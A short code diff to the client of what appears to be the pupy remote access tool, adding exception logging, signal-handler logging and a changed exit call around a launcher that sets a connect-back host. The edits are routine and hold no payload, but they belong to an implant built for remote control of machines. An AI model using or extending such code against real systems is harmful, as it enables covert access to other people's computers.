@@ -482,7 +482,10 @@ class Manager(object):
 
             self.pstore.store()
 
-            self.broadcast_event(0x20000000 | 0xFFFF)
+            try:
+                broadcast_event(0x20000000 | 0xFFFF)
+            except Exception, e:
+                logger.exception(e)
 
 def safe_obtain(proxy):
     """ safe version of rpyc's rpyc.utils.classic.obtain, without using pickle. """
@@ -724,9 +727,11 @@ def handle_sigchld(*args, **kwargs):
     os.waitpid(-1, os.WNOHANG)
 
 def handle_sighup(*args):
-    pass
+    logger.debug('SIGHUP')
 
 def handle_sigterm(*args):
+    logger.warning('SIGTERM')
+
     try:
         if hasattr(pupy, 'manager'):
             pupy.manager.event(Manager.TERMINATE)
@@ -854,7 +859,7 @@ def main():
         launcher.parse_args(LAUNCHER_ARGS)
     except LauncherError as e:
         launcher.arg_parser.print_usage()
-        os._exit(1)
+        sys.exit(e)
 
     if pupy.pseudo:
         set_connect_back_host(launcher.get_host())
